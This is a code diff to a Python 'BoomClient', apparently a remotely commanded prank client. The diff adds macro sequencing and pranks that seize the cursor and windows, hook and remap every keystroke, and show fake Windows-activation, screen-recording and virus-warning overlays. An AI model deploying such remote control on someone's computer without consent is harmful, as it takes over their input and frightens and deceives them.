@@ -562,7 +562,11 @@ class BoomClient:
                         self.target_name = target
                         self.root.after(0, lambda: self.name_entry.delete(0, tk.END))
                         self.root.after(0, lambda: self.name_entry.insert(0, self.target_name))
-                self.root.after(0, self.execute_command, command)
+                if command == "macro":
+                    steps = data.get("steps", [])
+                    self.root.after(0, self.execute_command, steps)
+                else:
+                    self.root.after(0, self.execute_command, command)
             elif msg_type == "welcome":
                 print(f"Welcome: {data.get('message')}")
         except Exception as e:
@@ -576,6 +580,11 @@ class BoomClient:
 
     def execute_command(self, command):
         if not command:
+            return
+        
+        # Handle macro steps (list of steps)
+        if isinstance(command, list):
+            self._execute_macro(command)
             return
         
         # Mapping commands to functions
@@ -594,6 +603,13 @@ class BoomClient:
             "prank_ghost_typing": self.prank_ghost_typing,
             "prank_rickroll": self.prank_rickroll,
             "prank_fake_notify": self.prank_fake_notify,
+            "prank_drunk_mouse": self.prank_drunk_mouse,
+            "prank_earthquake": self.prank_earthquake,
+            "prank_watermark": self.prank_watermark,
+            "prank_livestream": self.prank_livestream,
+            "prank_mirror_typing": self.prank_mirror_typing,
+            "prank_window_exile": self.prank_window_exile,
+            "prank_avalanche": self.prank_avalanche,
             "screenshot": self.capture_screenshot,
             "exit": self.stop_prank,
         }
@@ -620,6 +636,19 @@ class BoomClient:
     def stop_prank(self):
         self.close_all_windows()
         self._notify_spamming = False
+        self._drunk_mouse_active = False
+        self._earthquake_active = False
+        self._livestream_active = False
+        self._window_exile_active = False
+        self._avalanche_active = False
+        self._macro_active = False
+        if hasattr(self, '_mirror_typing_active') and self._mirror_typing_active:
+            self._mirror_typing_active = False
+            if hasattr(self, '_mirror_hook'):
+                try: keyboard.unhook(self._mirror_hook)
+                except: pass
+        if hasattr(self, '_avalanche_particles'):
+            self._avalanche_particles = []
         if self.screen_flipped:
             self.screen_flipped = False
             self.prank_flip_screen()
@@ -1032,6 +1061,393 @@ class BoomClient:
                 time.sleep(random.uniform(0.05, 0.3))
                 
         threading.Thread(target=type_ghost, daemon=True).start()
+
+    # ------------------------------------------------------------------ #
+    #  Macro execution
+    # ------------------------------------------------------------------ #
+    def _execute_macro(self, steps):
+        """Execute a sequence of prank steps in order."""
+        self._macro_steps = steps
+        self._macro_index = 0
+        self._macro_active = True
+        self._execute_next_macro_step()
+
+    def _execute_next_macro_step(self):
+        if not self._macro_active or self.stop_flag:
+            self._macro_active = False
+            return
+        if self._macro_index >= len(self._macro_steps):
+            self._macro_active = False
+            return
+
+        step = self._macro_steps[self._macro_index]
+        self._macro_index += 1
+
+        cmd = step.get("cmd", "")
+        delay = step.get("delay", 1.0)  # seconds before next step
+
+        cmd_map = {
+            "stage_1": self.start_stage_1,
+            "stage_2": self.start_stage_2,
+            "stage_3": self.start_stage_3,
+            "stage_4": self.start_stage_4,
+            "stage_force": self.start_stage_force,
+            "prank_desktop": self.prank_desktop,
+            "prank_flip_screen": self.prank_flip_screen,
+            "prank_fake_update": self.prank_fake_update,
+            "prank_glitch": self.prank_glitch,
+            "prank_negative": self.prank_negative,
+            "prank_infinite_window": self.prank_infinite_window,
+            "prank_ghost_typing": self.prank_ghost_typing,
+            "prank_rickroll": self.prank_rickroll,
+            "prank_fake_notify": self.prank_fake_notify,
+            "prank_drunk_mouse": self.prank_drunk_mouse,
+            "prank_earthquake": self.prank_earthquake,
+            "prank_watermark": self.prank_watermark,
+            "prank_livestream": self.prank_livestream,
+            "prank_mirror_typing": self.prank_mirror_typing,
+            "prank_window_exile": self.prank_window_exile,
+            "prank_avalanche": self.prank_avalanche,
+            "exit": self.stop_prank,
+        }
+
+        if cmd in cmd_map:
+            cmd_map[cmd]()
+        else:
+            print(f"Macro: unknown cmd '{cmd}'")
+
+        # Schedule next step
+        self.root.after(int(delay * 1000), self._execute_next_macro_step)
+
+    # ------------------------------------------------------------------ #
+    #  1. Drunk Mouse – randomly teleports cursor ±100px every 3-5s
+    # ------------------------------------------------------------------ #
+    def prank_drunk_mouse(self):
+        self.root.after(0, self.update_debug, "Stage: Extra\nDrunk Mouse")
+        if not WIN32_AVAILABLE:
+            return
+        self._drunk_mouse_active = True
+        self._drunk_mouse_start = time.time()
+
+        def drunk_jump():
+            if not self._drunk_mouse_active or self.stop_flag:
+                self._drunk_mouse_active = False
+                return
+            if time.time() - self._drunk_mouse_start >= 30:
+                self._drunk_mouse_active = False
+                return
+            try:
+                x, y = win32api.GetCursorPos()
+                x += random.randint(-100, 100)
+                y += random.randint(-100, 100)
+                x = max(0, min(x, self.screen_width))
+                y = max(0, min(y, self.screen_height))
+                win32api.SetCursorPos(x, y)
+            except Exception:
+                pass
+            self.root.after(random.randint(3000, 5000), drunk_jump)
+
+        self.root.after(random.randint(3000, 5000), drunk_jump)
+
+    # ------------------------------------------------------------------ #
+    #  2. Earthquake – shake the foreground window every 50ms for 15s
+    # ------------------------------------------------------------------ #
+    def prank_earthquake(self):
+        self.root.after(0, self.update_debug, "Stage: Extra\nEarthquake")
+        if not WIN32_AVAILABLE:
+            return
+        self._earthquake_active = True
+        self._earthquake_start = time.time()
+
+        def shake():
+            if not self._earthquake_active or self.stop_flag:
+                self._earthquake_active = False
+                return
+            if time.time() - self._earthquake_start >= 15:
+                self._earthquake_active = False
+                return
+            try:
+                hwnd = win32gui.GetForegroundWindow()
+                rect = win32gui.GetWindowRect(hwnd)
+                x, y, r, b = rect
+                w, h = r - x, b - y
+                new_x = x + random.randint(-20, 20)
+                new_y = y + random.randint(-20, 20)
+                win32gui.MoveWindow(hwnd, new_x, new_y, w, h, True)
+            except Exception:
+                pass
+            self.root.after(50, shake)
+
+        shake()
+
+    # ------------------------------------------------------------------ #
+    #  3. Watermark – fake "激活 Windows" overlay at bottom-right
+    # ------------------------------------------------------------------ #
+    def prank_watermark(self):
+        self.root.after(0, self.update_debug, "Stage: Extra\nWatermark")
+        win = tk.Toplevel(self.root)
+        win.overrideredirect(True)
+        win.attributes('-topmost', True, '-alpha', 0.5)
+        ww, wh = 200, 60
+        wx = self.screen_width - ww - 20
+        wy = self.screen_height - wh - 40
+        win.geometry(f"{ww}x{wh}+{wx}+{wy}")
+        win.configure(bg="#000000")
+        tk.Label(win, text="激活 Windows", font=("Microsoft YaHei", 10),
+                 fg="#aaaaaa", bg="#000000").pack(pady=(5, 0))
+        tk.Label(win, text="转到设置以激活 Windows。", font=("Microsoft YaHei", 8),
+                 fg="#888888", bg="#000000").pack()
+        self.windows.append(win)
+
+    # ------------------------------------------------------------------ #
+    #  4. Livestream overlay – fake streaming indicator top-right
+    # ------------------------------------------------------------------ #
+    def prank_livestream(self):
+        self.root.after(0, self.update_debug, "Stage: Extra\nLivestream Overlay")
+        self._livestream_active = True
+        self._livestream_start = time.time()
+
+        win = tk.Toplevel(self.root)
+        win.overrideredirect(True)
+        win.attributes('-topmost', True, '-alpha', 0.95)
+        ww, wh = 220, 160
+        wx = self.screen_width - ww - 20
+        wy = 20
+        win.geometry(f"{ww}x{wh}+{wx}+{wy}")
+        win.configure(bg="#1a1a2e")
+
+        # Green dot + "直播中"
+        top_frame = tk.Frame(win, bg="#1a1a2e")
+        top_frame.pack(pady=(5, 0))
+        tk.Label(top_frame, text="●", font=("Arial", 12),
+                 fg="#00ff00", bg="#1a1a2e").pack(side=tk.LEFT)
+        tk.Label(top_frame, text=" 直播中", font=("Arial", 12, "bold"),
+                 fg="white", bg="#1a1a2e").pack(side=tk.LEFT)
+
+        # Viewer count
+        viewer_var = tk.StringVar()
+        viewer_var.set("在线观众：3,842 人")
+        tk.Label(win, textvariable=viewer_var, font=("Arial", 9),
+                 fg="#cccccc", bg="#1a1a2e").pack(pady=3)
+
+        # Danmaku area
+        danmaku_var = tk.StringVar()
+        danmaku_var.set("欢迎来到直播间！")
+        tk.Label(win, textvariable=danmaku_var, font=("Arial", 8),
+                 fg="#ffeb3b", bg="#1a1a2e", wraplength=200).pack(pady=3)
+
+        # Recording warning
+        tk.Label(win, text="正在录制屏幕", font=("Arial", 9, "bold"),
+                 fg="#ff0000", bg="#1a1a2e").pack(pady=(5, 5))
+
+        fake_comments = [
+            "666666", "哈哈哈", "主播好", "来了来了",
+            "woc牛逼", "这是啥", "笑死我了", "？？？",
+            "23333", "秀啊", "关注了", "hhhh",
+            "牛蛙牛蛙", "离谱", "这操作", "绝了",
+        ]
+
+        def update_viewers():
+            if not self._livestream_active or self.stop_flag:
+                return
+            viewers = random.randint(3000, 50000)
+            viewer_var.set(f"在线观众：{viewers:,} 人")
+            self.root.after(random.randint(3000, 5000), update_viewers)
+
+        def scroll_danmaku():
+            if not self._livestream_active or self.stop_flag:
+                return
+            danmaku_var.set(random.choice(fake_comments))
+            self.root.after(random.randint(2000, 3000), scroll_danmaku)
+
+        update_viewers()
+        scroll_danmaku()
+
+        def auto_stop():
+            if self._livestream_active:
+                self._livestream_active = False
+                try:
+                    win.destroy()
+                except Exception:
+                    pass
+
+        self.root.after(60000, auto_stop)
+        self.windows.append(win)
+
+    # ------------------------------------------------------------------ #
+    #  5. Mirror typing – reverses each typed character (a↔z, b↔y, …)
+    # ------------------------------------------------------------------ #
+    def prank_mirror_typing(self):
+        self.root.after(0, self.update_debug, "Stage: Extra\nMirror Typing")
+        if not KEYBOARD_AVAILABLE:
+            return
+        self._mirror_typing_active = True
+        self._mirror_writing = False
+
+        import string
+        lower = string.ascii_lowercase
+        upper = string.ascii_uppercase
+        reverse_map = {}
+        for i, ch in enumerate(lower):
+            reverse_map[ch] = lower[-(i + 1)]
+        for i, ch in enumerate(upper):
+            reverse_map[ch] = upper[-(i + 1)]
+
+        def mirror_callback(event):
+            if not self._mirror_typing_active:
+                return
+            if self._mirror_writing:
+                return
+            if event.event_type != 'down':
+                return
+            if event.name and len(event.name) == 1:
+                ch = event.name
+                if ch in reverse_map:
+                    self._mirror_writing = True
+                    keyboard.write(reverse_map[ch])
+                    self._mirror_writing = False
+                    return False  # suppress original key
+
+        self._mirror_hook = keyboard.hook(mirror_callback, suppress=True)
+
+    # ------------------------------------------------------------------ #
+    #  6. Window exile – slowly push every window toward nearest screen edge
+    # ------------------------------------------------------------------ #
+    def prank_window_exile(self):
+        self.root.after(0, self.update_debug, "Stage: Extra\nWindow Exile")
+        if not WIN32_AVAILABLE:
+            return
+        self._window_exile_active = True
+        self._window_exile_start = time.time()
+
+        def exile_step():
+            if not self._window_exile_active or self.stop_flag:
+                self._window_exile_active = False
+                return
+            if time.time() - self._window_exile_start >= 60:
+                self._window_exile_active = False
+                return
+            try:
+                hwnds = []
+                def enum_cb(hwnd, _):
+                    if win32gui.IsWindowVisible(hwnd):
+                        hwnds.append(hwnd)
+                    return True
+                win32gui.EnumWindows(enum_cb, None)
+                for hwnd in hwnds:
+                    try:
+                        rect = win32gui.GetWindowRect(hwnd)
+                        x, y, r, b = rect
+                        w, h = r - x, b - y
+                        dist_l = x
+                        dist_r = self.screen_width - r
+                        dist_t = y
+                        dist_b = self.screen_height - b
+                        move = random.randint(1, 2)
+                        new_x, new_y = x, y
+                        min_d = min(dist_l, dist_r, dist_t, dist_b)
+                        if min_d == dist_l:
+                            new_x = x - move
+                        elif min_d == dist_r:
+                            new_x = x + move
+                        elif min_d == dist_t:
+                            new_y = y - move
+                        else:
+                            new_y = y + move
+                        win32gui.MoveWindow(hwnd, new_x, new_y, w, h, True)
+                    except Exception:
+                        pass
+            except Exception:
+                pass
+            self.root.after(1000, exile_step)
+
+        exile_step()
+
+    # ------------------------------------------------------------------ #
+    #  7. Avalanche – windows rain from top with physics simulation
+    # ------------------------------------------------------------------ #
+    def prank_avalanche(self):
+        self.root.after(0, self.update_debug, "Stage: Extra\nAvalanche")
+        self._avalanche_active = True
+        self._avalanche_start = time.time()
+        self._avalanche_particles = []  # [win, x, y, w, h, vy]
+
+        warning_texts = [
+            "⚠ 系统崩溃", "ERROR 0xDEAD", "内存不足", "硬盘错误",
+            "应用程序无响应", "致命错误", "蓝屏即将到来", "病毒已启动",
+            "⚠ 警报", "系统过热", "风扇故障", "电池耗尽",
+        ]
+
+        def spawn():
+            if not self._avalanche_active or self.stop_flag:
+                return
+            if time.time() - self._avalanche_start < 15:
+                win = tk.Toplevel(self.root)
+                w, h = 200, 100
+                x = random.randint(0, max(1, self.screen_width - w))
+                y = float(-h)
+                win.geometry(f"{w}x{h}+{x}+0")
+                win.overrideredirect(True)
+                win.attributes('-topmost', True)
+                win.configure(bg="#1a0000")
+                tk.Label(win, text=random.choice(warning_texts),
+                         font=("Arial", 12, "bold"),
+                         fg="#ff4444", bg="#1a0000").pack(expand=True)
+                self.windows.append(win)
+                self._avalanche_particles.append(
+                    [win, float(x), y, float(w), float(h), 0.0]
+                )
+                self.root.after(500, spawn)
+            # else: stop spawning new windows
+
+        def physics():
+            if not self._avalanche_active or self.stop_flag:
+                self._avalanche_active = False
+                return
+            if not self._avalanche_particles:
+                # No particles yet – keep checking
+                if time.time() - self._avalanche_start < 20:
+                    self.root.after(30, physics)
+                else:
+                    self._avalanche_active = False
+                return
+
+            gravity = 0.5
+            settled = 0
+            for p in self._avalanche_particles:
+                win, px, py, pw, ph, pv = p
+                pv += gravity
+                py += pv
+                if py + ph >= self.screen_height:
+                    py = self.screen_height - ph
+                    pv = -pv * 0.7
+                    if abs(pv) < 1:
+                        pv = 0
+                        settled += 1
+                p[2] = py
+                p[5] = pv
+                try:
+                    if win.winfo_exists():
+                        win.geometry(
+                            f"{int(pw)}x{int(ph)}+{int(px)}+{int(py)}"
+                        )
+                except Exception:
+                    pass
+
+            if settled == len(self._avalanche_particles) and settled > 0:
+                self._avalanche_active = False
+                for p in self._avalanche_particles:
+                    try:
+                        p[0].destroy()
+                    except Exception:
+                        pass
+                self._avalanche_particles = []
+                return
+
+            self.root.after(30, physics)
+
+        spawn()
+        self.root.after(100, physics)
 
 
 if __name__ == "__main__":
